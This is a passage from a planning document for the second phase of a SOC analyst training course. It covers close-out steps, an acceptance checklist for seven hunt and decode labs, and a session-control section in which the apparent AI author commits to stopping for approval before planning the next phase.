4. **Close-out:** `verify.py` green across all `s2-*` (incl. uid-consistency and pcap↔zeek agreement);
   `tools/lint-labs.sh` + `tools/shellcheck-all.sh` + `tests/acceptance.sh` green (extend
   `tests/acceptance.sh` with a P2 section — 7 labs, fabricated pass + negative case each — and fix the
   catalog-count denominators the way prior close-outs did); `lab status`/`resume` render p2; update
   `planned_execution.md`; tag `soc-p2`. **Per the multi-phase execution rule, gate at each lab — do
   not chain all 7 in one unattended pass.**

## 6. Acceptance checklist mapping (PROMPTS.md §174–181)

- **Lab count/titles/types match the map** — §4 entries are map-exact (7 labs, L2.7 gate; types DECODE/
  HUNT/GUIDED as §150–162).
- **Every lab self-tested, real outputs pasted** — build-order step 2, per lab.
- **shellcheck clean** — every check.sh follows §2.1 (constants + fixed normalize recipe + the §2
  bracket-escape one-liner for defanged IOCs); no `disable=`.
- **Gate lab integrative + next-opener recall drafted** — L2.7 (+ parked L3.1 recall, [VERIFY-AT-BUILD]).
- **Evidence generated + consistency-verified** — §2 generator extensions + `verify.py` (in-window
  timestamps, entity resolution, key-id presence, no-defang-in-raw, no-fang-in-prose, uid consistency,
  pcap↔zeek agreement, beacon-count equality).
- **`lab status` renders phase; `resume` works mid-phase** — close-out step.
- **Defang discipline** — raw zeek/pcap never defanged; prose + answer keys + learner IOC submissions
  defanged, graded with the §2 regex-escape recipe (D5).
- **Flat-file first / SO overlay** — all 7 labs grade against `files/`; SO is an ungraded appendix on
  L2.4/L2.5/L2.7 only (D4).

---

## Session control (PLAN-AHEAD, all remaining soc phases)

This is Phase 2 of a plan-ahead pass covering every unbuilt soc phase (2 → 3 → 4 → 5 → 6 → 7), one at
a time. Phase 0+1 is already planned (`soc-p01-plan.md`); nothing is built yet. **After this plan is
approved and saved to `docs/plans/soc-p2-plan.md`, I STOP and wait for explicit go-ahead before
planning Phase 3 (Endpoint Triage Fundamentals).** No building, no commits, no `planned_execution.md`
edits this session — plans only, one file per phase under `docs/plans/soc-p<N>-plan.md`.
